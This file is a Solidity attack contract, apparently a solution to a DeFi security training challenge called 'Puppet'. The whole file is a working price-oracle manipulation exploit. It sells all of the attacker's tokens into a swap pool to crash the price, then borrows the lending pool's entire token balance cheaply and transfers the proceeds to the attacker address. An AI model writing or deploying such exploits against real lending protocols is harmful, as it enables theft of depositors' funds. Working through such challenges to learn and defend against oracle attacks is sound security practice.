pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract PuppetAttack {
  address private _lending;
  address private _swap;
  address private _token;
  address private _attacker;
  address private _factory;

  constructor(address lending, address swap, address token, address attacker, address factory) {
    _lending = lending;
    _swap = swap;
    _token = token;
    _attacker = attacker;
    _factory = factory;
  }

  function init() external{
    uint256 tokenAmount = getTokenBalance(_attacker);

    (bool isTransfer, ) = _token.call(
      abi.encodeWithSignature("transferFrom(address,address,uint256)", _attacker, address(this), tokenAmount)
    );

    require(isTransfer, "isTransfer");

    (bool isApprove, ) = _token.call(
      abi.encodeWithSignature("approve(address,uint256)", _swap, tokenAmount)
    );

    require(isApprove, "isApprove");
  }

  function getTokenBalance(address _a) internal returns (uint256) {
    (bool isBalanceOf, bytes memory balanceOfResult) = _token.call(
      abi.encodeWithSignature("balanceOf(address)", _a)
    );
    require(isBalanceOf, "isBalanceOf");

    (uint256 tokenAmount) = abi.decode(balanceOfResult, (uint256));

    return tokenAmount;
  }

  function attack() external {
    sellAllToken();

    borrow();

    sendToken(_attacker, getTokenBalance(address(this)));
  }

  function sendToken(address targetAddress, uint256 amount) internal {
    
    (bool isSendToSwap, ) = _token.call(
      abi.encodeWithSignature("transfer(address,uint256)", targetAddress, amount)
    );

    require(isSendToSwap, "isSendToSwap");
  }

  function borrow() internal {
    uint256 tokenLeftAtLending = getTokenBalance(_lending);

    (bool isBorrow, ) = _lending.call{ value: address(this).balance }(
      abi.encodeWithSignature("borrow(uint256)", tokenLeftAtLending)
    );

    require(isBorrow, "isBorrow");
  }

  function sellAllToken() internal {
    uint256 tokenAmount = getTokenBalance(address(this));

    (bool isSwap, bytes memory swapResult) = _swap.call(
      abi.encodeWithSignature(
        "tokenToEthSwapInput(uint256,uint256,uint256)",
        tokenAmount-1, // -1 just to bypass the gt check in the test
        1,
        block.timestamp + 300
      )
    );

    require(isSwap, "isSwap");
  }

  receive() external payable { }
}
